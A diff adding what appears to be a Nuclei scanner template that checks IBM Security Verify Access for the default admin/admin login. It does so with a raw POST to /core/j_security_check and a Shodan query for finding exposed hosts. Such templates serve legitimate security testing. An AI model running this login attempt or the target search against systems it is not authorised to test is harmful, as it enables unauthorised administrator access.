@@ -1,0 +1,46 @@
+id: ibm-security-verify-default-login
+
+info:
+  name: IBM Security Verify Access - Default Login
+  author: johnk3r
+  severity: high
+  description: |
+    IBM Security Verify Access default admin credentials were discovered. An unauthenticated, remote attacker can exploit this gain privileged or administrator access to the system.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: title:"IBM Security Verify Access"
+  tags: ibm,default-login
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /core/j_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        j_username={{username}}&j_password={{password}}&commit=&locale=en&_method=PUT
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "status_code == 302"
+          - "contains(set_cookie, 'LtpaToken2')"
+        condition: and
+# digest: 490a00463044022055af20ce5cec5fcfde921a40c8221ec5d37dafbe51896ba7d8b075675bf884c8022049565735cd1e9e39ddee2b33f80b50017699611e0112f35e9cc64be3a254e373:922c64590222798bb761d5b6d8e72950
